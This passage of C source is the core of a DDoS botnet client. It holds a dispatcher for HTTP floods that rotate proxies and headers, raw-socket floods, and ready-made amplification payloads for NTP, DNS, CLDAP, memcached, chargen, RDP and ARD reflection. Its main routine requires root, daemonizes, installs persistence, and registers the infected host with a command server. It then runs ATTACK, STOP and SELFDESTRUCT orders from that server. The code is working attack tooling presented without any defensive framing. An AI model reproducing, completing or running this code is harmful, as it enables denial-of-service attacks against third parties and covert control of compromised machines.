    strncpy(url, argv[2], sizeof(url) - 1);
    {
        char *p = url;
        while (*p == ' ' || *p == '\t') p++;
        if (strncmp(p, "http", 4) != 0) {
            char tmp[4096];
            snprintf(tmp, sizeof(tmp), "http://%s", p);
            strncpy(url, tmp, sizeof(url) - 1);
        }
    }

    if (is_layer7(method)) {
        if (argc < 7) _exit(1);
        parse_url(url, &target);
        if (strcmp(m, "TOR") != 0) {
            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) _exit(1);
        } else {
            strncpy(host_ip, target.host, sizeof(host_ip));
        }
        proxy_ty = atoi(argv[3]);
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[4]);
        rpc = atoi(argv[5]);
        timer = atoi(argv[6]);
        ua_cnt = load_lines("files/useragent.txt", &uas, MAX_USERAGENTS);
        if (ua_cnt == 0) {
            uas = malloc(sizeof(char*));
            uas[0] = strdup("Mozilla/5.0");
            ua_cnt = 1;
        }
        ref_cnt = load_lines("files/referers.txt", &refs, MAX_REFERERS);
        if (ref_cnt == 0) {
            refs = malloc(sizeof(char*));
            refs[0] = strdup("https://www.google.com/");
            ref_cnt = 1;
        }
        if (proxy_ty != 0) {
            pt = (proxy_type_t)proxy_ty;
            if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
            proxy_t *pa = malloc(sizeof(proxy_t) * MAX_PROXIES);
            if (pa) {
                proxy_cnt = load_proxies(proxy_path, pa, MAX_PROXIES, pt);
                if (proxy_cnt > 0) proxies = pa;
                else free(pa);
            }
        }
        *g_shared_running = 1;
        for (i = 0; i < workers; i++) {
            wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                layer7_args_t a;
                srand((unsigned)(time(NULL) ^ getpid() ^ i));
                memset(&a, 0, sizeof(a));
                a.target = target;
                strncpy(a.host_ip, host_ip, sizeof(a.host_ip));
                a.method = method;
                a.rpc = rpc;
                a.thread_id = i;
                a.proxies = proxies;
                a.proxy_count = proxy_cnt;
                a.useragents = uas;
                a.useragent_count = ua_cnt;
                a.referers = refs;
                a.referer_count = ref_cnt;
                a.running = g_shared_running;
                a.use_ssl = (strcmp(target.scheme, "https") == 0);
                strncpy(a.local_ip, g_local_ip, sizeof(a.local_ip));
                run_l7(&a);
                _exit(0);
            }
            g_worker_pids[g_worker_count++] = wpid;
        }
        start = time(NULL);
        while (!g_stop_requested && (time(NULL) - start) < timer) usleep(100000);
        *g_shared_running = 0;
        kill_workers();
        _exit(0);

    } else if (is_layer4(method)) {
        if (argc < 4) _exit(1);
        parse_url(url, &target);
        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
        port = target.port;
        if (port < 1 || port > 65535) _exit(1);
        timer = atoi(argv[3]);
        if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
             method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
             method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
            !check_raw_socket()) _exit(1);
        if (argc >= 5 && strlen(argv[4]) > 0) {
            char *a4 = argv[4];
            if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
                method == METHOD_ARD) {
                char rp[512];
                FILE *rf;
                snprintf(rp, sizeof(rp), "files/%s", a4);
                rf = fopen(rp, "r");
                if (rf) {
                    char line[256];
                    refs = malloc(sizeof(char *) * MAX_REFS);
                    while (fgets(line, sizeof(line), rf) && ref_cnt < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) refs[ref_cnt++] = strdup(line);
                    }
                    fclose(rf);
                }
            }
        }
        protocolid = MINECRAFT_DEFAULT_PROTOCOL;
        if (method == METHOD_MCBOT) {
            int probe = socket(AF_INET, SOCK_STREAM, 0);
            if (probe >= 0) {
                struct sockaddr_in addr;
                struct timeval tv = {2, 0};
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target_ip, &addr.sin_addr);
                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    uint8_t hs[1024];
                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
                    send(probe, hs, hslen, 0);
                    uint8_t ping_pkt[16];
                    uint8_t zero = 0x00;
                    int pinglen = mc_data(&zero, 1, ping_pkt);
                    send(probe, ping_pkt, pinglen, 0);
                    uint8_t resp[1024];
                    int rlen = recv(probe, resp, sizeof(resp), 0);
                    if (rlen > 0) {
                        char *pp = strstr((char*)resp, "\"protocol\":");
                        if (pp) {
                            int pv = atoi(pp + 11);
                            if (pv > 47 && pv < 758) protocolid = pv;
                        }
                    }
                }
                close(probe);
            }
        }
        *g_shared_running = 1;
        for (i = 0; i < workers; i++) {
            wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                layer4_args_t a;
                srand((unsigned)(time(NULL) ^ getpid() ^ i));
                memset(&a, 0, sizeof(a));
                strncpy(a.target_ip, target_ip, sizeof(a.target_ip));
                a.target_port = port;
                a.method = method;
                a.protocolid = protocolid;
                a.proxies = proxies;
                a.proxy_count = proxy_cnt;
                a.refs = refs;
                a.ref_count = ref_cnt;
                a.running = g_shared_running;
                strncpy(a.local_ip, g_local_ip, sizeof(a.local_ip));
                if (method == METHOD_ICMP) a.target_port = 0;
                if (method == METHOD_RDP) { uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp(&a, p, 16, 3389); }
                else if (method == METHOD_CLDAP) { uint8_t p[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00}; set_amp(&a, p, 39, 389); }
                else if (method == METHOD_MEM) { uint8_t p[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'}; set_amp(&a, p, 19, 11211); }
                else if (method == METHOD_CHAR) { uint8_t p[] = {0x01}; set_amp(&a, p, 1, 19); }
                else if (method == METHOD_ARD) { uint8_t p[] = {0x00,0x14,0x00,0x00}; set_amp(&a, p, 4, 3283); }
                else if (method == METHOD_NTP) { uint8_t p[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00}; set_amp(&a, p, 8, 123); }
                else if (method == METHOD_DNS_AMP) { uint8_t p[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp(&a, p, 31, 53); }
                run_l4(&a);
                _exit(0);
            }
            g_worker_pids[g_worker_count++] = wpid;
        }
        start = time(NULL);
        while (!g_stop_requested && (time(NULL) - start) < timer) usleep(100000);
        *g_shared_running = 0;
        kill_workers();
        _exit(0);
    }
}

static void handle_cmd(const char *cmd) {
    char buf[CMD_BUF_SIZE];
    char *args[MAX_ARGS];
    int argc = 0;
    char *p;
    if (!cmd || !*cmd) return;
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    args[argc++] = "x";
    p = buf;
    while (*p && argc < MAX_ARGS) {
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        args[argc++] = p;
        while (*p && *p != ' ' && *p != '\t') p++;
        if (*p) *p++ = 0;
    }
    if (argc < 2) return;
    exec_attack(argc, args);
}

static void cleanup(void) {
    stop_attack();
    release_lock();
}

int main(int argc, char **argv) {
    const char *host;
    int port;
    char arch[64], osinfo[256];
    struct sigaction sa;
    int sock, n;
    char cmd[CMD_BUF_SIZE];
    int is_root;

    if (geteuid() != 0) {
        _exit(0);
    }

    ssize_t rlen = readlink("/proc/self/exe", g_self_path, sizeof(g_self_path) - 1);
    if (rlen > 0) {
        g_self_path[rlen] = 0;
    } else {
        if (argc > 0 && argv[0][0] == '/') {
            strncpy(g_self_path, argv[0], sizeof(g_self_path) - 1);
        }
    }

    if (tornar_daemon() < 0) {
        _exit(1);
    }

    replace_old_instance();

    is_root = check_root();
    acquire_lock();
    atexit(cleanup);

    install_persistence();

    host = SERVER_HOST;
    port = SERVER_PORT;
    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = atoi(argv[2]);

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigchld_fn;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGCHLD, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    srand((unsigned)(time(NULL) ^ getpid()));
    get_local_ip(g_local_ip, sizeof(g_local_ip));
    get_arch(arch, sizeof(arch));
    get_osinfo(osinfo, sizeof(osinfo));

    while (1) {
        sock = tcp_connect(host, port, 10);
        g_server_sock = sock;
        if (sock < 0) { sleep(RECONNECT_DELAY); continue; }
        if (send_line(sock, "HELLO|%s|%s|%s|%d", arch, osinfo, g_local_ip, is_root) < 0) {
            close(sock); sleep(RECONNECT_DELAY); continue;
        }
        while (1) {
            n = recv_line(sock, cmd, sizeof(cmd));
            if (n < 0) break;
            if (n == 0) continue;
            if (strcmp(cmd, "PING") == 0) {
                if (send_line(sock, "PONG|%s|%d", arch, g_attack_running ? 1 : 0) < 0) break;
            } else if (strcmp(cmd, "SELFDESTRUCT") == 0) {
                handle_cmd(cmd);
                break;
            } else if (strcmp(cmd, "STOP") == 0) {
                stop_attack();
                send_line(sock, "STATUS|stopped");
            } else if (strncmp(cmd, "ATTACK|", 7) == 0) {
                handle_cmd(cmd + 7);
                send_line(sock, "STATUS|attacking");
            } else {
                handle_cmd(cmd);
            }
        }
        close(sock);
        stop_attack();
        sleep(RECONNECT_DELAY);
    }
    return 0;
}